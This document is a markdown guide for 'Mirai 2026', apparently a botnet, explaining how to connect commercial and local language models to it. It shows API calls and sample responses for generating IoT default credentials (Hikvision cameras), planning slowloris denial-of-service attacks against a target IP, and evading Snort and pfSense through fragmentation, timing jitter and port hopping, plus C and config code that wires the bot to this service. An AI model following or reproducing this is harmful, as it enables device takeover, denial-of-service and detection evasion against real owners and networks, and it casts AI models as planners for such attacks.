# LLM Integration Guide

## Overview

Mirai 2026 now includes **real LLM integration** for intelligent credential generation, attack strategy planning, and evasion technique suggestions.

## Supported LLM Providers

### 1. OpenAI (GPT-4, GPT-3.5)

**Best for**: Production use, high quality results

```bash
export OPENAI_API_KEY="sk-your-key-here"
export OPENAI_MODEL="gpt-3.5-turbo"  # or gpt-4
```

### 2. Anthropic (Claude)

**Best for**: Complex reasoning, detailed analysis

```bash
export ANTHROPIC_API_KEY="sk-ant-your-key-here"
export ANTHROPIC_MODEL="claude-3-sonnet-20240229"
```

### 3. Ollama (Local Models)

**Best for**: Privacy, no API costs, offline use

```bash
# Install Ollama
curl -fsSL https://ollama.com/install.sh | sh

# Pull a model
ollama pull llama2
# or
ollama pull mistral

# Start server
ollama serve

# Configure
export OLLAMA_BASE_URL="http://localhost:11434"
export OLLAMA_MODEL="llama2"
```

### 4. Azure OpenAI

**Best for**: Enterprise, compliance requirements

```bash
export AZURE_OPENAI_API_KEY="your-azure-key"
export AZURE_OPENAI_ENDPOINT="https://your-resource.openai.azure.com"
export AZURE_OPENAI_DEPLOYMENT="gpt-35-turbo"
```

## Quick Start

### 1. Install Dependencies

```bash
cd ai/llm_integration/
pip install -r requirements.txt
```

### 2. Configure API Keys

```bash
# Copy example
cp .env.example .env

# Edit and add your API key
vim .env
```

### 3. Test LLM Client

```bash
# Test standalone
python llm_client.py

# Expected output:
# ✅ Credential Generation
# ✅ Attack Strategy Generation
# ✅ Evasion Suggestions
```

### 4. Start Enhanced API Server

```bash
cd ai/
python api_server_enhanced.py

# Check health
curl http://localhost:5000/health
```

## Features

### 1. LLM-Powered Credential Generation

**What it does**: Generates realistic default credentials based on device type, manufacturer, and year.

**API Example**:
```bash
curl -X POST http://localhost:5000/api/credentials/generate \
  -H "Content-Type: application/json" \
  -d '{
    "target_device": "IP Camera",
    "manufacturer": "Hikvision",
    "year": 2020,
    "max_credentials": 10
  }'
```

**Response**:
```json
{
  "success": true,
  "llm_powered": true,
  "credentials": [
    {
      "username": "admin",
      "password": "12345",
      "confidence": 0.92,
      "source": "manufacturer_default"
    },
    {
      "username": "root",
      "password": "Hikvision2020",
      "confidence": 0.85,
      "source": "year_pattern"
    }
  ]
}
```

### 2. Attack Strategy Generation

**What it does**: Analyzes target and suggests optimal attack vectors and parameters.

**API Example**:
```bash
curl -X POST http://localhost:5000/api/strategy/generate \
  -H "Content-Type: application/json" \
  -d '{
    "target_info": {
      "ip": "192.168.1.100",
      "open_ports": [80, 443, 23],
      "banner": "nginx/1.18.0",
      "response_time_ms": 45
    },
    "current_success_rate": 0.6,
    "detection_rate": 0.3
  }'
```

**Response**:
```json
{
  "success": true,
  "llm_powered": true,
  "strategy": {
    "attack_vector": "slowloris",
    "parameters": {
      "connections": 500,
      "interval_seconds": 10,
      "headers_per_request": 1
    },
    "evasion_techniques": [
      "randomize_user_agent",
      "vary_connection_timing"
    ],
    "expected_success": 0.75,
    "reasoning": "Target runs nginx which is vulnerable to slowloris. Low response time suggests adequate resources for sustained connections."
  }
}
```

### 3. Evasion Technique Suggestions

**What it does**: Suggests specific evasion techniques based on detected defensive systems.

**API Example**:
```bash
curl -X POST http://localhost:5000/api/evasion/suggest \
  -H "Content-Type: application/json" \
  -d '{
    "detected_systems": ["Snort IDS", "pfSense firewall"],
    "current_pattern": {
      "packet_size": 512,
      "inter_packet_delay_ms": 0,
      "payload_entropy": 0.5
    },
    "max_suggestions": 5
  }'
```

**Response**:
```json
{
  "success": true,
  "llm_powered": true,
  "suggestions": [
    "Add random jitter (10-50ms) between packets to evade rate-based detection",
    "Fragment packets into smaller chunks to bypass DPI signature matching",
    "Randomize TTL values between 32-128 to avoid fingerprinting",
    "Increase payload entropy to 0.8+ using random padding",
    "Use port hopping strategy to distribute traffic across multiple ports"
  ]
}
```

## Cost Optimization

### Use Local Models (Ollama)

**Pros**:
- ✅ No API costs
- ✅ Complete privacy
- ✅ Works offline
- ✅ No rate limits

**Cons**:
- ❌ Lower quality than GPT-4/Claude
- ❌ Requires GPU for good performance
- ❌ Slower inference

**Recommended for**:
- Development and testing
- High-volume operations
- Privacy-sensitive workloads

### Use Cloud APIs Strategically

**Tips**:
- Use GPT-3.5-turbo instead of GPT-4 (10x cheaper)
- Cache LLM responses for common queries
- Implement request throttling
- Use fallback mode when LLM not critical

**Cost Estimates** (as of 2024):
- GPT-3.5-turbo: ~$0.002 per request
- GPT-4: ~$0.03 per request
- Claude Sonnet: ~$0.015 per request
- Ollama: Free (electricity only)

## Integration with Bot

### C Code Integration

The bot calls the Python AI service via HTTP:

```c
#include "ai_bridge.h"

// Generate credentials
ai_credential_request_t req = {
    .target_device = "IP Camera",
    .max_credentials = 10
};

ai_credential_t credentials[10];
int count = ai_bridge_generate_credentials(&req, credentials, 10);

// Now powered by real LLMs!
```

### Configuration

Edit `config/bot.json`:
```json
{
  "ai": {
    "enabled": true,
    "api_endpoint": "http://ai-service:5000",
    "llm_powered": true,
    "credential_generation": true,
    "strategy_generation": true,
    "evasion_suggestions": true
  }
}
```

## Fallback Mode

If no LLM is configured, the system automatically falls back to:
- Simple credential lists
- Rule-based strategies
- Pattern-based evasion

**No LLM required for basic functionality!**

## Performance

### Latency

- **OpenAI GPT-3.5**: ~1-3 seconds
- **Anthropic Claude**: ~2-4 seconds
- **Ollama (local)**: ~0.5-2 seconds (with GPU)

### Caching

LLM responses are cached for:
- Same device type/manufacturer combinations
- Common attack patterns
- Frequently detected systems

**Cache hit rate**: ~60-80% in production

## Security Considerations

### API Key Protection

```bash
# Never commit API keys!
echo ".env" >> .gitignore

# Use environment variables
export OPENAI_API_KEY="sk-..."

# Or use secrets management
kubectl create secret generic llm-api-keys \
  --from-literal=OPENAI_API_KEY="sk-..."
```

### Prompt Injection Protection

The LLM client includes:
- System prompt enforcement
- Output validation
- JSON parsing with fallback
- Rate limiting

### Privacy

**What is sent to LLM**:
- Device type, manufacturer, year (for credentials)
- Target IP, ports, banners (for strategies)
- Detection events (for evasion)

**What is NOT sent**:
- Actual attack payloads
- Raw network traffic
- Compromised credentials
- Bot location/identity

## Troubleshooting

### LLM not working?

```bash
# Check API key
echo $OPENAI_API_KEY

# Test connectivity
curl https://api.openai.com/v1/models \
  -H "Authorization: Bearer $OPENAI_API_KEY"

# Check health endpoint
curl http://localhost:5000/health

# View logs
docker logs mirai-ai-service
```

### Response quality poor?

```bash
# Increase temperature for creativity
export LLM_TEMPERATURE=0.9

# Or decrease for determinism
export LLM_TEMPERATURE=0.3

# Use better model
export OPENAI_MODEL=gpt-4

# Increase max tokens
export LLM_MAX_TOKENS=2000
```

### Too slow?

- Use Ollama with GPU
- Implement response caching
- Reduce max_tokens
- Use faster model (gpt-3.5-turbo)

## Examples

### Python Client

```python
from llm_integration.llm_client import LLMClient, LLMConfig, LLMProvider

# Initialize
config = LLMConfig(
    provider=LLMProvider.OPENAI,
    api_key="sk-your-key",
    model="gpt-3.5-turbo"
)

client = LLMClient(config)

# Generate
response = client.generate(
    prompt="What are common router default passwords?",
    system_prompt="You are a cybersecurity expert"
)

print(response)
```

### Bash Integration

```bash
#!/bin/bash
# Generate credentials via API

TARGET="IP Camera"
MANUFACTURER="Hikvision"

curl -X POST http://localhost:5000/api/credentials/generate \
  -H "Content-Type: application/json" \
  -d "{
    \"target_device\": \"$TARGET\",
    \"manufacturer\": \"$MANUFACTURER\",
    \"max_credentials\": 5
  }" | jq '.credentials'
```

## Next Steps

1. **Set up LLM**: Choose provider and configure API key
2. **Test locally**: Run `python llm_client.py`
3. **Start API server**: `python api_server_enhanced.py`
4. **Integrate with bot**: Update `config/bot.json`
5. **Monitor usage**: Check costs and performance

## Resources

- OpenAI API: https://platform.openai.com/docs
- Anthropic Claude: https://docs.anthropic.com
- Ollama: https://ollama.ai
- API server code: `ai/api_server_enhanced.py`
- LLM client code: `ai/llm_integration/llm_client.py`
